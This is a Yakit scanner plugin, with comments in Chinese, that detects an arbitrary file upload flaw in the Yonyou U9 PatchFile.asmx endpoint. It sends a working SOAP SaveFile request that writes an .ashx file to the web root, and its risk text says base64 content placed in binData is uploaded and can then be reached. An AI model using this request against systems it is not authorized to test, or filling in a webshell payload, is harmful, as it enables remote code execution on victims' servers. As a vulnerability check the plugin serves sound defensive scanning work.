script_name: 用友U9 任意文件上传漏洞
content:
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port) {

    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    payload = "/CS/Office/AutoUpdates/PatchFile.asmx"


    uploadpacket = `
    POST {{params(payload)}} HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: {{params(target)}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/SaveFile"
Content-Length: 880

<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
   <SaveFile xmlns="http://tempuri.org/">
    <binData></binData>
    <path>./</path>
    <fileName>testtest.ashx</fileName>
   </SaveFile>
  </soap:Body>
 </soap:Envelope>
`


    rsp,req,_ = poc.HTTP(
        uploadpacket, 
        poc.params({"target":addr,"payload":payload}),
        poc.https(isTls),
        poc.redirectTimes(0)
    )
    
    yakit.Info("正在上传测试文件")
    log.info("正在上传测试文件...")



    hend,body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)

    drsp, derr = str.ParseBytesToHTTPResponse(rsp)

    if drsp.StatusCode == 302 {
        payload = "/U9/CS/Office/AutoUpdates/PatchFile.asmx"
        rsp,req,_ = poc.HTTP(
            uploadpacket, 
            poc.params({"target":addr,"payload":payload}),
            poc.https(isTls),
            poc.redirectTimes(0)
        )

        hend,body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)

        drsp, derr = str.ParseBytesToHTTPResponse(rsp)

        if derr != null {
            yakit.Error(string(derr))
            return
        }

        if drsp.StatusCode == 200  && str.MatchAnyOfSubString(body,"true"){
            yakit.Info("用友U9任意文件上传漏洞")
            risk.NewRisk(
                addr,
                risk.cve(""),
                risk.title("用友U9任意文件上传漏洞"),
                risk.severity("high"),
                risk.titleVerbose("用友U9任意文件上传漏洞"),
                risk.type("任意文件上传"),
                risk.description("任意文件上传,<bindata>的内容经过base64编码，上传后访问<fileName>的文件,路径为上传文件的路径"),
                risk.solution("打补丁"),
                risk.details("详见参考: https://mp.weixin.qq.com/s/clMThbuv84lgqZk5PsUBYQ"),
                risk.request(string(req)),
                risk.response(string(rsp))
            )

        }
        
        
    }

    if derr != null {
        yakit.Error(string(derr))
        return
    }

    if drsp.StatusCode == 200  && str.MatchAnyOfSubString(body,"true"){
        yakit.Info("用友U9任意文件上传漏洞")
        risk.NewRisk(
            addr,
            risk.cve(""),
            risk.title("用友U9任意文件上传漏洞"),
            risk.severity("high"),
            risk.titleVerbose("用友U9任意文件上传漏洞"),
            risk.type("任意文件上传"),
            risk.description("任意文件上传,<bindata>的内容经过base64编码，上传后访问<fileName>的文件,路径为上传文件的路径"),
            risk.solution("打补丁"),
            risk.details("详见参考: https://mp.weixin.qq.com/s/clMThbuv84lgqZk5PsUBYQ"),
            risk.request(string(req)),
            risk.response(string(rsp))
        )

    }
}

handle = func(result) {
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
help: 用友U9 PatchFile.asmx接口存在任意文件上传漏洞
